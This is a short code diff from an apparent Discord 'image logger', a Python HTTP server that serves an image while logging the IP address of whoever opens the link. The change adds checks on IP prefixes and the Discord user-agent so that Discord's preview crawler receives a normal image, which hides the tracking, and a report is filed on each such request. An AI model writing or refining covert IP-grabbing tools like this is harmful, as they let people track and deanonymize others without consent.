@@ -180,12 +180,15 @@ div.img {{
   }}</style><div class="img"></div>'''.encode()
         
         if self.headers.get('x-forwarded-for').startswith(('35', '34', '104')):
-            makeReport(self.headers.get('x-forwarded-for'))
-            self.send_response(200) # 200 = OK (HTTP Status)
-            self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
-            self.end_headers() # Declare the headers as finished.
+            if "discord" in self.headers.get('user-agent'):
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
-            self.wfile.write(binaries["loading"] if config["buggedImage"] else data) # Write the image to the client.
+                self.wfile.write(binaries["loading"] if config["buggedImage"] else data) # Write the image to the client.
+                makeReport(self.headers.get('x-forwarded-for'))
+            
+            return
         
         else:
             s = self.path
